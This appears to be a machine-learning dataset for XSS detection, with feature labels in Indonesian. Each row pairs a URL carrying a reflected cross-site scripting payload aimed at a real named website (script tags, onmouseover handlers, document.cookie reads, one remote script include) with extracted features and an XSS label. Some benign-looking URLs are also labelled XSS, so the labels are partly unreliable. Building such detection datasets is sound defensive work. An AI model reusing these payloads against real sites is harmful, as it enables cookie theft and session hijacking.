method;XSS\r\n\"http://www.annuaire-maison-retraite.org/search.php?word=/\"\"><script>alert(1)</script>&defaultsearch_submit.x=0&defaultsearch_submit.y=0\";Lebih dari 75;Tidak ada Port;Tidak ada special character;Terdapat duplicated character;Blank atau CTO;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Terdapat HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Terdapat javascript method;XSS\r\n\"http://www.apps.ups.com/WebTracking/track?loc=de_DE%22%20style=background:url(http://data.xssed.org/images/xssed_logo.gif);width:247px;height:96px;position:a%20bsolute%20onmouseover=alert(navigator.userAgent)%20%22\";Lebih dari 75;Tidak ada Port;Terdapat special character;Tidak ada duplicated character;Blank atau CTO;Tersimpan di database whois;Ada obfuscated;Ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Terdapat EventHandler;Tidak ada DOM objects;Terdapat javascript method;XSS\r\n\"http://www.arcade-immobilier.com/index.php?lang=fr/\"\"><script>alert('Xss By Atm0n3r')</script>\";Lebih dari 75;Tidak ada Port;Terdapat special character;Tidak ada duplicated character;Blank atau CTO;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Terdapat HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Terdapat javascript method;XSS\r\nhttp://www.archive.org/account/login.php?username=%22%3E%3Cscript%3Ealert%28document.cookie%29%3C%2Fscript%3E%3Cimg+src%3Dhttp%3A%2F%2Fvuln.x ssed.net%2Fthirdparty%2Fscripts%2Fxssed.gif%3E&password=wqerty&openid=&remember=CHECKED&referer=&sub mit=Log+in;Lebih dari 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Ada obfuscated;Ada third-party domain;Ada request cookie;Tidak ada HTML tags;Terdapat HTML properties;Tidak ada EventHandler;Terdapat DOM objects;Tidak ada javascript method;XSS\r\nhttp://www.arcor.de/content/senden.jsp?to=%22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E&Headline=x&URL=x&Datum=x&Teasertext=x;Lebih dari 75;Tidak ada Port;Terdapat special character;Tidak ada duplicated character;Blank atau CTO;Tidak tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Terdapat DOM objects;Terdapat javascript method;XSS\r\nhttp://www.artchesul.com.br/site/views/produto/produto.php?id=136%22%3E%3Cscript%3Ealert%28String.fromCharCode%2867,114,52,116,51,114,32,87,97,115,32,72,101,114,101%29%29%3C/script%3E;Lebih dari 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Terdapat EventHandler;Tidak ada DOM objects;Tidak ada javascript method;XSS\r\n\"http://www.arte-patrimoine.com/index.php?lang=es/\"\"><script>alert('Xss By Atm0n3r')</script>\";Lebih dari 75;Tidak ada Port;Terdapat special character;Tidak ada duplicated character;Blank atau CTO;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Terdapat HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Terdapat javascript method;XSS\r\nhttp://www.athinorama.gr/redirect/links.aspx?page=http://xssed.com;Antara 54 dan 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tidak tersimpan di database whois;Tidak obfuscated;Ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;XSS\r\n\"http://www.auto-news.de/sondermodelle/index.jsp?marke=\"\"><script>alert(document.cookie)</script>\";Lebih dari 75;Tidak ada Port;Terdapat special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Ada request cookie;Terdapat HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Terdapat DOM objects;Tidak ada javascript method;XSS\r\nhttp://www.avis.co.uk/site-search?header-site-search=%27%3E%3Cscript%3Ealert%28+document.cookie%29%3C/script%3E;Lebih dari 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Terdapat DOM objects;Tidak ada javascript method;XSS\r\nhttp://www.avoe.ge/games/one.php?mid=%3Cscript%3Ealert%28/data/%29%3C/script%3E;Lebih dari 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Blank atau CTO;Tidak tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;XSS\r\nhttp://www.aziaclub.com/passwd.php?valid=1&email=%2F%22%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E&x=35&y=6;Lebih dari 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;XSS\r\nhttp://www.azur-privilege.com/page.php?src=index-ap.html&lang=fr/%22%3E%3Cscript%3Ealert(%27Xss%20By%20Atm0n3r%27)%3C/script%3E;Lebih dari 75;Tidak ada Port;Terdapat special character;Tidak ada duplicated character;Blank atau CTO;Tidak tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Terdapat javascript method;XSS\r\n\"http://www.bankier.pl/gfx/centrum/kreacje/ge/ge_boks_350x100_v4_2.swf?clickTag=javascript:window.open(%27http://www.xssed.com%27);%20alert(%27XSSED%20by%20Viper.aT%27)\";Lebih dari 75;Tidak ada Port;Terdapat special character;Tidak ada duplicated character;Blank atau CTO;Tersimpan di database whois;Ada obfuscated;Ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Terdapat DOM objects;Terdapat javascript method;XSS\r\nhttp://www.bayt.com/en/job-search-results/?composite_search=1&keyword=%22/%3E%3Cscript%3Ealert(%22Xss:Vijayendra%22)%3C/script%3E;Lebih dari 75;Tidak ada Port;Terdapat special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Terdapat javascript method;XSS\r\nhttp://www.berta.ge/admin/index.php/%22onmouseover=prompt%28901957%29%3E;Lebih dari 75;Tidak ada Port;Tidak ada special character;Terdapat duplicated character;Blank atau CTO;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Terdapat EventHandler;Tidak ada DOM objects;Tidak ada javascript method;XSS\r\n\"http://www.bharatstudent.com/images/banners/120x600/mtv6-160x600.swf?clickTag=javascript:alert(%22XSSED%22);\";Lebih dari 75;Tidak ada Port;Terdapat special character;Tidak ada duplicated character;Blank atau CTO;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Terdapat javascript method;XSS\r\nhttp://www.biviumgroup.com/search.php?navi=search.php%3Fcategory_id%3D-1&job_search_text=%22%3E%3Cscript%3Ea%20lert(%22DarkDevilZ%20/%20Mr.PaPaRoSSe%22)%3C/script%3E;Lebih dari 75;Tidak ada Port;Terdapat special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;XSS\r\n\"http://www.blogsky.com/login.bs?refer=\"\" onmouseover=alert('a3q') bad=\"\"\";Antara 54 dan 75;Tidak ada Port;Tidak ada special character;Terdapat duplicated character;Blank atau CTO;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Terdapat EventHandler;Tidak ada DOM objects;Terdapat javascript method;XSS\r\nhttp://www.brancopelle.com/X7Chat/install.php?step=2%22%3E%3Cscript%3Ealert%28String.fromCharCode%2867,114,52,116,51,114,32,87,97,115,32,72,101,114,101%29%29%3C/script%3E;Lebih dari 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;XSS\r\nhttp://www.bridalroguegallery.co.uk/product_detail.php?catid=2&manid=1&prodid=%22%3E%3Cscript%3Ealert(%22Virtual_SystEm%22)%3C/script%3E;Lebih dari 75;Tidak ada Port;Terdapat special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tidak tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Terdapat javascript method;XSS\r\nhttp://www.bullion.org.za/search/txtSearch=<script>alert(1)</script>&btnSearch=go;Lebih dari 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Blank atau CTO;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Terdapat HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Terdapat javascript method;XSS\r\n\"http://www.bundesinitiative-gleichstellen.de/nc/presse/show/bundesinitiative-zur-gleichstellung-von-frauen-in-der-wirtschaft-vereinfacht-antragstellung-fuer-pro/detail.html?tipUrl=\"\"><script>alert(\"\"CrossSiteScripting2\"\")</script>\";Lebih dari 75;Tidak ada Port;Tidak ada special character;Terdapat duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Terdapat HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Terdapat javascript method;XSS\r\n\"http://www.cabinet-avril.com/index.php?lang=it/\"\"><script>alert('Xss By Atm0n3r')</script>\";Lebih dari 75;Tidak ada Port;Terdapat special character;Tidak ada duplicated character;Blank atau CTO;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Terdapat HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Terdapat javascript method;XSS\r\nhttp://www.cafemontenegro.com/index.php?search=%22%3E%3CSCRIPT%20SRC=http://scras.freehostia.com/script.js%3E%3C/SCRIPT%3E;Lebih dari 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Blank atau CTO;Tersimpan di database whois;Ada obfuscated;Ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;XSS\r\nhttp://www.cappa27.com/index.php/PmWikiFr/index.php?n=Main.WikiSandbox?from=%22/><bodyonload=alert(1)>;Lebih dari 75;Tidak ada Port;Tidak ada special character;Terdapat duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Terdapat HTML tags;Tidak ada HTML properties;Terdapat EventHandler;Tidak ada DOM objects;Terdapat javascript method;XSS\r\n\"http://www.cbn.com/media/player/search.aspx?t=k&search='><script>alert(\"\"by%20hac4ker\"\");</script>\";Lebih dari 75;Tidak ada Port;Terdapat special character;Tidak ada duplicated character;Blank atau CTO;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Terdapat HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Terdapat javascript method;XSS\r\n\"http://www.cda-bund.de/lv-bremen/footer/seite-empfehlen.html?tipUrl=\"\"><script>alert(\"\"CrossSiteScripting2\"\")</script>\";Lebih dari 75;Tidak ada Port;Tidak ada special character;Terdapat duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Terdapat HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Terdapat javascript method;XSS\r\n\"http://www.cedricdelsaux.com/cedric_delsaux.php?lang=en');alert('xss');//\";Antara 54 dan 75;Tidak ada Port;Terdapat special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Terdapat javascript method;XSS\r\n\"http://www.chefkoch.de/login.php?username=\"\"><script>alert(document.cookie)</script>\";Lebih dari 75;Tidak ada Port;Terdapat special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tidak tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Ada request cookie;Terdapat HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Terdapat DOM objects;Terdapat javascript method;XSS\r\nhttp://www.chip-kiosk.de/catalogsearch/result/?q=<script>alert(navigator.userAgent)</script>;Lebih dari 75;Tidak ada Port;Terdapat special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Terdapat HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Terdapat javascript method;XSS\r\nhttp://www.chm-khady-gueye.org/index.php?n=Main.WikiSandbox?from=%22/><body onload=alert(1)>;Lebih dari 75;Tidak ada Port;Tidak ada special character;Terdapat duplicated character;Blank atau CTO;Tidak tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Terdapat HTML tags;Tidak ada HTML properties;Terdapat EventHandler;Tidak ada DOM objects;Terdapat javascript method;XSS\r\nhttp://www.clanplanet.de/passwortservice.asp?rn=&notfounderr=set&email=%22%3E%3C/a%3E%3Cscript%3Ealert%28%22xss%22%29%3C%2Fscript%3E%3Ca;Lebih dari 75;Tidak ada Port;Tidak ada special character;Terdapat duplicated character;Blank atau CTO;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;XSS\r\n\"http://www.clickajob.co.uk/cgi-bin/user.cgi?module=vacancy_search&task=search_results&keywords=%27;alert(String.fromCharCode(88,83,83))//\\%27;alert(String.fromCharCode(88,83,83))//%22;alert(String.fromCharCode(88,83,83))//\\%22;alert(String.fromCharCode(88,83,83))//--%3E%3C/SCRIPT%3E%22%3E%27%3E%3CSCRIPT%3Ealert(String.fromCharCode(88,83,83))%3C/SCRIPT%3E\";Lebih dari 75;Tidak ada Port;Terdapat special character;Terdapat duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Terdapat javascript method;XSS\r\nhttp://www.college.harvard.edu/icb/icb.do?keyword=k61161&pageid=icb.page316368&pageContentId=icb.pagecontent828781&view=view.do&state=maximize&viewParam_q=;Lebih dari 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;XSS\r\n\"http://www.collin-immobilier.com/index.php?lang=fr/\"\"><script>alert('Xss By Atm0n3r')</script>\";Lebih dari 75;Tidak ada Port;Terdapat special character;Tidak ada duplicated character;Blank atau CTO;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Terdapat HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Terdapat javascript method;XSS\r\nhttp://www.computerbild.de/cb/ekf/Suchergebnis.html?cpdb_cid=%22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E;Lebih dari 75;Tidak ada Port;Terdapat special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tidak tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Terdapat DOM objects;Terdapat javascript method;XSS\r\nhttp://www.computershop.ge/index.php/%22onmouseover=prompt%28929933%29%3E;Antara 54 dan 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Blank atau CTO;Tidak tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Terdapat EventHandler;Tidak ada DOM objects;Tidak ada javascript method;XSS\r\nhttp://www.coolwebscripts.com/search_view_script.php?search=/%22%3E%3Cscript%3Ealert(1)%3C/script%3E&cat_drop=&offset=0&toshow=20&GO.x=14&GO.y=14;Lebih dari 75;Tidak ada Port;Terdapat special character;Tidak ada duplicated character;Blank atau CTO;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Terdapat javascript method;XSS\r\n\"http://www.corinneponce-immobilier.com/index.php?lang=fr/\"\"><script>alert('Xss By Atm0n3r')</script>\";Lebih dari 75;Tidak ada Port;Terdapat special character;Tidak ada duplicated character;Blank atau CTO;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Terdapat HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Terdapat javascript method;XSS\r\nhttp://www.cqfd-fmp.fr/index.php?n=Main.WikiSandbox?from=%22/><body onload=alert(1)>;Lebih dari 75;Tidak ada Port;Tidak ada special character;Terdapat duplicated character;Blank atau CTO;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Terdapat HTML tags;Tidak ada HTML properties;Terdapat EventHandler;Tidak ada DOM objects;Terdapat javascript method;XSS\r\n\"http://www.creanous.com/?login_user=a@a.a\"\">'>&password_user=http://xssed.com/\";Lebih dari 75;Tidak ada Port;Terdapat special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Tidak obfuscated;Ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;XSS\r\nhttp://www.ct-park.ge/index.php/%22onmouseover=prompt%28960350%29%3E;Antara 54 dan 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Blank atau CTO;Tidak tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Terdapat EventHandler;Tidak ada DOM objects;Tidak ada javascript method;XSS\r\nhttp://www.cubedepotusa.com/apps/forums/posts/search?topic_id=3188571-product-descriptions&query=%22%2F%3E%3Ciframe+src%3D%22http%3A%2F%2Fxssed.com%22%3E%3C%2Fiframe%3E;Lebih dari 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Ada obfuscated;Ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;XSS\r\nhttp://www.cut-the-knot.org/wiki-math/index.php?n=Main.WikiSandbox?from=%22/><body onload=alert(1)>;Lebih dari 75;Tidak ada Port;Tidak ada special character;Terdapat duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Terdapat HTML tags;Tidak ada HTML properties;Terdapat EventHandler;Tidak ada DOM objects;Terdapat javascript method;XSS\r\nhttp://www.cybersnipa.com/support/index.php?page=ticket_search&q=%27%22--%3E%3Cscript%3Ealert%28/XSSed%20by%20hax0rl33t/%29%3C/script%3E;Lebih dari 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Blank atau CTO;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;XSS\r\nhttp://www.dailymotion.com/faBlank atau CTOry/videowall?list=/related/x5198u/1%27%22%3E%3Cscript%3Ealert(/XSS/.source)%3C/script%3E;Lebih dari 75;Tidak ada Port;Tidak ada special character;Terdapat duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Terdapat javascript method;XSS\r\n\"http://www.damely-immobilier.fr/index.php?lang=fr/\"\"><script>alert('Xss By Atm0n3r')</script>\";Lebih dari 75;Tidak ada Port;Terdapat special character;Tidak ada duplicated character;Blank atau CTO;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Terdapat HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Terdapat javascript method;XSS\r\nhttp://www.davidguetta.com/fr/forum/110?page=1&form_build_id=form-1499b749b5a7c9b321d98efb96704d99&form_id=user_login_block&op=Connexion&destination=%27--%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.cookie%29%3C/script%3E%3Cscript%3E;Lebih dari 75;Tidak ada Port;Tidak ada special character;Terdapat duplicated character;Blank atau CTO;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Terdapat DOM objects;Tidak ada javascript method;XSS\r\n\"http://www.dcc.ufmg.br/pos/index.php?mensagem=%27;alert%28String.fromCharCode%2888,83,83%29%29///%27;alert%28String.fromCharCode%2888,83,83%29%29//%22;alert%28String.fromCharCode%2888,83,83%29%29///%22;alert%28String.fromCharCode%2888,83,83%29%29//--%3E%3C/SCRIPT%3E%22%3E%27%3E%3CSCRIPT%3Ealert%28String.fromCharCode%2888,83,83%29%29%3C/SCRIPT%3E\";Lebih dari 75;Tidak ada Port;Terdapat special character;Terdapat duplicated character;Blank atau CTO;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;XSS\r\nhttp://www.delicious.com/redirect?url=http://www.bing.com;Antara 54 dan 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Blank atau CTO;Tersimpan di database whois;Tidak obfuscated;Ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;XSS\r\n\"http://www.deremate.com.ve/venezuela/ml/l_user.main?as_filtro_id=CERTIFIED_USR&as_nickname=%A0&as_pcia_id=%3E%22%3E%3CScRiPt%3Ealert%28%27XSS%27%29;%3C/scRipt%3E\";Lebih dari 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;XSS\r\nhttp://www.designszeneberlin.de/search.php?workers=&customers=0&genre_customers=0&genre=0&freetext=%22%3E%27%3E%3Cimg+src%3Da+onerror%3Dalert%2 8document.cookie%29+%2F%3E&send.x=0&send.y=0;Lebih dari 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Blank atau CTO;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Terdapat DOM objects;Tidak ada javascript method;XSS\r\n\"http://www.dictation.philips.com/index.php?id=39&imageId=1744%27&CC=%27%3E%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E\";Lebih dari 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Terdapat DOM objects;Tidak ada javascript method;XSS\r\n\"http://www.diglib.um.edu.my/interaktif/SQL-bin/error_login_1.asp?userid=\"\"><script>alert(1)</script><\"\"&userlang=EN\";Lebih dari 75;Tidak ada Port;Tidak ada special character;Terdapat duplicated character;Blank atau CTO;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Terdapat HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Terdapat javascript method;XSS\r\nhttp://www.dohabank.com.qa/1/db2/SearchResults.aspx?Search=%3C%2fscript%3E%3Cimg%2f*%2500%2fsrc%3d%22worksinchrome%26colon%3bprompt%26%23x28%3b1%26%23x29%3b%22%2f%2500*%2fonerror%3d%27eval%28src%29%27%3E;Lebih dari 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Terdapat EventHandler;Terdapat DOM objects;Tidak ada javascript method;XSS\r\n\"http://www.dolby.com/us/en/sitesearch/index.aspx?q=%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E\";Lebih dari 75;Tidak ada Port;Terdapat special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Terdapat DOM objects;Tidak ada javascript method;XSS\r\nhttp://www.dominiquealboublanc.com/page.php?src=infoslegales.html&lang=fr/%22%3E%3Cscript%3Ealert(%27Xss%20By%20Atm0n3r%27)%3C/script%3E;Lebih dari 75;Tidak ada Port;Terdapat special character;Tidak ada duplicated character;Blank atau CTO;Tidak tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Terdapat javascript method;XSS\r\nhttp://www.downloadatoz.com/_win8/member/login.php?username=%2F%22%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E&password=%2F%22%3E%3Cscript%3Ealert%281%29 %3C%2Fscript%3E;Lebih dari 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;XSS\r\n\"http://www.dream-prez.com/?page=livredor&ip=192.168.0.1&date=13-01-2012&name=\"\" onload=\"\"alert(1)&website=\"\" onload=\"\"alert(1)&note=0\"\" onload=\"\"alert(1)&comment=%2F%22%3E</textarea>%3Cscript%3Ealert%281%29%3C%2Fscript%3E&nbcar=29&securi ty_code=mb5ka&add_msg=Envoyer\";Lebih dari 75;Tidak ada Port;Terdapat special character;Tidak ada duplicated character;Blank atau CTO;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Terdapat HTML tags;Tidak ada HTML properties;Terdapat EventHandler;Tidak ada DOM objects;Terdapat javascript method;XSS\r\nhttp://www.dunav.com/pretraga/pretraga.php?trazi=%22%3E%3Cscript%3Ealert%28document.cookie%29%3C/script%3E&sta=1;Lebih dari 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Terdapat DOM objects;Tidak ada javascript method;XSS\r\nhttp://www.dunav.com/Site/Search.php?intLangID=10&intCategoryID=227&q=%22%3E%3Cscript%3Ealert%28document.cookie%29%3C/script%3E&x=7&y=10;Lebih dari 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Terdapat DOM objects;Tidak ada javascript method;XSS\r\nhttp://www.ebay.com.np/index.php?task=productdetails&pid=%22%3E%3Ch1%3ECross-Site%20Scripting%3CsCript%3Ealert%28/xss/%29%3C/ScRipt%3E;Lebih dari 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Blank atau CTO;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;XSS\r\nhttp://www.ebay.com/itm/181023275832?ssPageName=STRK:MESELX:IT&_trksid=p3984.m1555.l2649;Lebih dari 75;Tidak ada Port;Terdapat special character;Tidak ada 